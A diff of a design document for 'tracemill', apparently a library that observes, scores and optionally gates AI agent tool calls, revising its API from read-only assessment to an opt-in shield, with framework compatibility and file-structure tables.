-async def permission_handler(request, invocation):
-    result = pipeline.assess({
-        "tool_name": request.tool_name or request.kind,
-        "tool_input": {"command": request.full_command_text},
-        "session_id": invocation.session_id,
-    })
-    if result.governance_assessment.value in ("deny", "transform"):
-        return PermissionRequestResult(kind="reject")
-    if result.governance_assessment.value == "escalate":
-        decision = await ask_team_lead(result)
-        return decision
-    return PermissionRequestResult(kind="approve-once")
+policy = GatePolicy().preflight(preflight)
+pipeline = Pipeline.create(policy=policy)   # facade; shield enabled
+
+pipeline.gate_crewai()                 # CrewAI hooks
+tool = pipeline.gate_langchain(tool)   # wrap a LangChain tool
+pipeline.gate_maf()                    # Microsoft Agent Framework middleware
 ```
 
-#### SDK callback (Claude Code SDK)
+The `Shield` enforces the returned `Verdict` using each framework's native blocking mechanism.
+The optional postflight callback receives the tool output for audit. (The `gate_*` helpers also
+exist directly on `GovernancePipeline` for gating-only use.)
+
+#### Shell hook (Copilot / Claude Code CLI)
+
+The consumer's hook script pipes the tool-call event to `tracemill gate`, which relays it to the
+running pipeline's IPC server and prints a verdict in the framework's format:
+
+```bash
+#!/bin/bash
+# Claude Code PreToolUse hook — consumer's script
+echo "$TOOL_EVENT_JSON" | tracemill gate --stdin --format claude-code
+# the JSON/exit-code verdict is consumed by the agent's native hook contract
+```
+
+#### SDK callback (read-only)
+
+Consumers that prefer to interpret recommendations themselves can score and branch:
 
 ```python
-from claude_code_sdk import PermissionResultAllow, PermissionResultDeny
 from tracemill.governance.pipeline import GovernancePipeline
 
-pipeline = GovernancePipeline.create()
+gov = GovernancePipeline.create()
 
-async def can_use_tool(tool_name, input_data, context):
-    result = pipeline.assess({
+async def can_use_tool(tool_name, input_data, session_id):
+    trace = gov.score_tool_call({
         "tool_name": tool_name,
         "tool_input": input_data,
-        "session_id": context.session_id,
+        "session_id": session_id,
     })
-    if result.governance_assessment.value in ("deny", "escalate", "transform"):
-        return PermissionResultDeny(message=result.reason)
-    return PermissionResultAllow()
+    return trace.suggested_action not in ("deny", "escalate", "transform")
 ```
 
 ### What tracemill Owns vs What the Consumer Owns
 
 | tracemill | Consumer |
 |-----------|----------|
-| Observation pipeline (always-on) | Hook scripts |
-| Event parsing (framework mappings) | Enforcement logic (block/allow) |
-| Classification + risk scoring | Escalation flow (human-in-the-loop) |
-| Rule evaluation → `GovernanceAssessment` | Timeout handling |
-| Session state (taint, drift, budget) | Exit code mapping |
-| Storage (sinks: JSONL, SQLite) | Notification channels (Slack, email) |
-| `.assess()` API | Assessment → enforcement decision |
+| Observation pipeline (always-on) | Which events / sources to observe |
+| Event parsing (framework mappings) | Escalation flow (human-in-the-loop) |
+| Classification + risk scoring (`Assessor`) | Notification channels (Slack, email) |
+| Rule evaluation → `RecommendedAction` | Final authority over allow / deny |
+| One session-state authority (taint, drift, budget) | Registering a `GatePolicy` (opt-in) |
+| Storage (sinks) | Audit retention policy |
+| `observe_event()` / `score_tool_call()` | Interpreting the assessment |
+| Opt-in `Shield` → `Verdict` enforcement | Timeout / failure handling |
 
 ### The Single Flow
 
 ```
 1. Agent session starts
 2. tracemill observation pipeline starts (reads from configured source)
-3. Events stream in → Parse → Phase 1/2/3 → GovernanceAssessment
-   • State accumulates (taint, drift, budget) — ONLY on observed execution
-   • on_assessment callback fires (if registered)
-   • Sinks persist (always)
-4. IF consumer's hook fires (pre-execution):
-   a. Consumer's hook script/callback calls tracemill assess
-   b. Pipeline runs Phase 2/3 (read-only) against current session state
-   c. Returns AssessmentResult to consumer
-   d. Consumer maps assessment to allow/deny/escalate
-   e. Consumer returns decision to framework
-5. Observation pipeline continues:
-   • Allowed events: appear in source → Phase 1 mutates state → persist
-   • Denied events: never in source → no state mutation (budget stays accurate)
+3. Events stream in -> parse -> enrich -> classify -> structure -> observe (monitor stage)
+   • SessionState advances once per real tool call — the single writer, single counter
+   • Each emitted event carries its SessionMeta on metadata.governance; sinks persist
+4. IF a Shield (GatePolicy) is registered AND a pre-execution hook fires:
+   a. Hook relays the pending call (score_tool_call / tracemill gate)
+   b. Monitor scores it read-only against current session state
+   c. GatePolicy maps the recommendation to a Verdict (allow / deny)
+   d. Shield enforces via the framework's native mechanism, records the outcome in SessionState
+5. Observation continues:
+   • Allowed events: appear in source -> monitor advances state -> persist
+   • Denied events: never in source, never committed -> no state mutation (budget stays accurate)
 ```
 
 ### Deduplication
 
-The `.assess()` call is **read-only** — it scores against accumulated state but does NOT mutate budget, taint, or drift. State changes only occur when the observation pipeline processes an event from its source (confirming execution):
+`score_tool_call()` is **read-only** — it scores against accumulated state but does NOT advance
+the counter, budget, taint, or drift. State changes only when the monitor observes an event from
+its source via `observe_event` (confirming execution):
 
-- **Allowed events:** Observation sees them naturally, processes Phase 1/2/3, commits state changes, persists to sinks.
-- **Denied events:** Never appear in source. The consumer should call `pipeline.record_blocked(payload, result)` *(future)* to emit a synthetic `tool.blocked` audit event to sinks.
+- **Allowed events:** observation sees them naturally, scores them, advances state, persists.
+- **Denied events:** never appear in the source, so they never advance state.
 
-This design ensures that blocked calls never corrupt budget/taint state. The observation pipeline is the single source of truth for state mutations.
+Blocked calls therefore never corrupt budget / taint state. The monitor is the single source of
+truth for state mutations.
 
 ### Configuration (`tracemill.yaml`)
 
-The `governance` section configures the scoring engine. Same shape in YAML and SDK:
+The `governance` section configures the monitor + assessor. Same shape in YAML and SDK:
 
 ```yaml
 # tracemill.yaml
@@ -1483,7 +1796,7 @@ SDK equivalent (no YAML needed):
 from tracemill.config import GovernanceConfig, BudgetConfig
 from tracemill.governance.pipeline import GovernancePipeline
 
-pipeline = GovernancePipeline.create(GovernanceConfig(
+gov = GovernancePipeline.create(GovernanceConfig(
     db_path="./tracemill.db",
     project_root=".",
     pii_scanning=True,
@@ -1491,94 +1804,83 @@ pipeline = GovernancePipeline.create(GovernanceConfig(
 ))
 ```
 
-Rules live in `recommendation_rules.yaml`. They produce assessments, not enforcement decisions.
-
-### Pipeline API
-
-```python
-from tracemill.governance.pipeline import GovernancePipeline
-from tracemill.config import GovernanceConfig
-
-class GovernancePipeline:
-    """Observation + assessment. No enforcement."""
-
-    @classmethod
-    def create(cls, config: GovernanceConfig | None = None) -> "GovernancePipeline":
-        """Construct from config. None = all defaults (in-memory, PII on, no budget caps)."""
-        ...
-
-    def assess(self, payload: dict) -> AssessmentResult:
-        """Read-only preflight assessment against current session state.
-
-        payload keys:
-            tool_name: str (required)
-            tool_input: dict (required)
-            session_id: str (required)
-            server_namespace: str (optional, for MCP tools)
-            project_root: str (optional)
-
-        Runs Phase 2/3 (labeling + risk/rules) → returns AssessmentResult.
-        Does NOT mutate session state (budget, taint, drift).
-        Does NOT persist to sinks.
-        """
-        ...
-```
+Rules live in `classify/data/recommendation_rules.yaml`. They produce recommendations, not
+enforcement decisions.
 
 ### Design Constraints
 
-1. **tracemill never decides** — it assesses. Enforcement is the consumer's responsibility.
-2. **No Verdict type** — tracemill has no concept of allow/deny as a binary decision.
-3. **No enforcement config** — no `gate.enabled`, no `escalate_policy`, no exit code mapping.
-4. **Assessment is always computed** — whether or not anyone calls `.assess()`, observation produces assessments for every event.
-5. **`.assess()` is read-only** — scores against accumulated state without mutating budget/taint/drift. State mutations only happen when observation confirms execution.
-6. **Session state is shared** — `.assess()` and observation share the same state snapshot for scoring. Observation alone commits mutations.
-7. **No framework dependencies** — tracemill never imports Copilot, Claude, LangGraph, etc.
-8. **Rules are data** — `governance_rules.yaml`. Turing-incomplete.
-9. **Callbacks are optional** — `on_assessment` is for consumers who want push. Sinks persist regardless.
+1. **One state authority** — `SessionState` owns a single tool-call counter and is mutated only
+   through its own methods; there is no second counter and no external field access.
+2. **Single writer** — only the `SessionMonitor` advances `SessionState`; the `Assessor` is
+   side-effect-free, so a read-only score is an assessment of an un-advanced snapshot.
+3. **Monitor observes, shield enforces** — observation recommends; enforcement is opt-in via a
+   registered `GatePolicy`. Final authority stays with the consumer.
+4. **Program to interfaces (DIP/OCP)** — `Assessor` and `GatePolicy` are injected strategies
+   constructed at the `GovernancePipeline` composition root; collaborators depend on abstractions.
+5. **Determinism** — non-deterministic enrichment is captured onto the event and never
+   re-derived during state mutation, so replay reproduces the live assessment.
+6. **No framework dependencies in the core** — the monitor / shield never import Copilot, Claude,
+   LangGraph, etc.; the `gate_*` adapters wrap frameworks at the edge.
+7. **Rules are data** — `recommendation_rules.yaml`. Turing-incomplete.
+8. **Fail-closed enforcement** — any error inside the shield's chains yields DENY (preflight) or
+   SUPPRESS (postflight); sinks and callbacks remain optional.
 
 ### Framework Compatibility
 
-| # | Platform | Hook type | Consumer calls | Gateable? |
-|---|----------|-----------|----------------|-----------|
-| 1 | **Copilot CLI** | Shell script | `tracemill assess --framework copilot` | ✓ |
-| 2 | **Copilot Cloud** | Shell script | Same | ✓ |
-| 3 | **Copilot SDK** | In-process | `pipeline.assess(payload)` | ✓ |
-| 4 | **Claude Code CLI** | Shell script | `tracemill assess --framework claude` | ✓ |
-| 5 | **Claude Code SDK** | In-process | `pipeline.assess(payload)` | ✓ |
-| 6 | **Cline** | Shell script | `tracemill assess --framework cline` | ✓ |
-| 7 | **OpenHands** | Shell script | `tracemill assess --framework openhands` | ✓ |
-| 8 | **Goose** | In-process | `pipeline.assess(payload)` | ✓ |
-| 9 | **OpenCode** | In-process | `pipeline.assess(payload)` | ✓ |
-| 10 | **LangGraph** | In-process | `pipeline.assess(payload)` | ✓ |
-| 11 | **CrewAI** | In-process | `pipeline.assess(payload)` | ✓ |
-| 12 | **PydanticAI** | In-process | `pipeline.assess(payload)` | ✓ |
-| 13 | **MAF / Semantic Kernel** | In-process | `pipeline.assess(payload)` | ✓ |
+| # | Platform | Hook type | Consumer entry point | Gateable? |
+|---|----------|-----------|----------------------|-----------|
+| 1 | **Copilot CLI** | Shell script | `tracemill gate --stdin` | ✓ |
+| 2 | **Copilot Cloud** | Shell script | `tracemill gate --stdin` | ✓ |
+| 3 | **Copilot SDK** | In-process | `pipeline.score_tool_call(...)` | ✓ |
+| 4 | **Claude Code CLI** | Shell script | `tracemill gate --stdin --format claude-code` | ✓ |
+| 5 | **Claude Code SDK** | In-process | `pipeline.score_tool_call(...)` | ✓ |
+| 6 | **Cline** | Shell script | `tracemill gate --stdin` | ✓ |
+| 7 | **OpenHands** | Shell script | `tracemill gate --stdin` | ✓ |
+| 8 | **Goose** | In-process | `pipeline.score_tool_call(...)` | ✓ |
+| 9 | **OpenCode** | In-process | `pipeline.score_tool_call(...)` | ✓ |
+| 10 | **LangGraph / LangChain** | In-process | `pipeline.gate_langchain(tool)` | ✓ |
+| 11 | **CrewAI** | In-process | `pipeline.gate_crewai()` | ✓ |
+| 12 | **PydanticAI** | In-process | `pipeline.gate_pydantic_ai(agent)` | ✓ |
+| 13 | **MAF / Semantic Kernel** | In-process | `pipeline.gate_maf()` | ✓ |
 | 14 | **Aider** | None | — | ✗ (observation only) |
-| 15 | **smolagents** | None | — | ✗ (observation only) |
+| 15 | **smolagents** | Class wrap | `pipeline.gate_smolagents()` | ✓ |
 | 16 | **SWE-agent** | None | — | ✗ (observation only) |
 
-Rows 14–16 have no pre-execution hook. tracemill observes and assesses their events, but no consumer can block tool calls.
+Rows 14 and 16 have no pre-execution hook. tracemill observes and scores their events, but no
+consumer can block their tool calls.
 
 ### File Structure
 
 ```
 src/tracemill/
-├── config/
-│   ├── models.py            # GovernanceConfig, BudgetConfig, TracemillConfig
-│   └── loader.py            # load_config() — reads tracemill.yaml
-├── governance/              # The engine (classification + rules + state)
-│   ├── pipeline.py          # GovernancePipeline (Phase 1/2/3, .assess(), .create())
-│   ├── rules.py             # Rule, Predicate, evaluate_rules()
+├── pipeline.py              # EventPipeline — observation backbone + governance stage
+├── enricher.py              # Classification + risk enrichment
+├── trace.py                 # EventTrace, TraceStage (unified record)
+├── governance/              # The monitor + shield engine
+│   ├── pipeline.py          # GovernancePipeline — composition root / facade (delegates)
+│   ├── monitor.py           # SessionMonitor — single writer (observe / process / lifecycle)
+│   ├── scorer.py            # Scorer — read-only preview (score_tool_call* / preflight)
+│   ├── context.py           # ContextBuilder — payload / event -> EnrichmentContext
+│   ├── phase1.py            # Phase1 — the Phase-1 state-advance step (writer + preview share it)
+│   ├── registry.py          # SessionRegistry — residency + LRU eviction + reservations
+│   ├── assessor.py          # Assessor — (snapshot, event) -> SessionMeta (label+risk+drift)
+│   ├── codec.py             # MetaCodec — (de)serialize SessionMeta + snapshots
+│   ├── shield.py            # Shield — gate context + preflight/postflight + record allow/deny
+│   ├── state.py             # SessionState — one counter, mutated only via methods
+│   ├── persistence.py       # SystemStore — durability (reservations, atomic commit)
+│   ├── results.py           # RecommendedAction, RiskRecommendation, SessionMeta
 │   ├── labeler.py           # GovernanceLabeler
-│   ├── state.py             # SessionState (taint, budget, drift)
-│   └── ...
-├── assess/                  # Public assessment types
-│   ├── __init__.py          # AssessmentResult, GovernanceAssessment
-│   ├── types.py             # Dataclasses
-│   └── assessor.py          # assess() implementation (stateless)
-├── classify/                # Classification engine
-├── sinks/                   # Storage backends (JSONL, SQLite, S3)
-└── mappings/                # Framework YAML definitions
+│   ├── rules.py             # Rule, Predicate, evaluate_rules()
+│   └── ...                  # pii, ifc, integrity, drift, budget, observer
+├── sdk/                     # Pipeline facade + GatePolicy + Verdict + gate_* helpers
+│   ├── pipeline.py          # Pipeline — backbone + governance stage + gating delegates
+│   ├── gate_policy.py       # GatePolicy (Policy strategy)
+│   ├── gate_types.py        # GateContext, ToolCallRequest/Result, PostflightVerdict
+│   └── verdict.py           # Verdict
+├── gate/                    # Cross-process gate IPC (tracemill gate)
+├── gates/                   # Bundled detectors (PII)
+├── classify/                # Classification engine + data/recommendation_rules.yaml
+└── sinks/                   # Storage backends
 ```
 
 ---
